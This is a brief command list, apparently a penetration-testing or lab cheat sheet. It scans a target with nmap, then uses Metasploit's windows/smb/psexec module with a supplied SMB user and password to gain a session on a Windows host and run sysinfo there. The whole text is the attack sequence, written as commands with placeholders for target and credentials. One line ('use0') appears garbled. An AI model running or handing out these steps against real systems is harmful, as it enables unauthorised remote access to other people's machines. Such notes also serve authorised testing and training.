Run
      nmap -sN -Pn -A [target IP] 

      msfconsole 
      search exploit/windows/smb/psexec

      use0


      set SMBPass [password]
      set SMBUser [user]
      run
      
      sysinfo
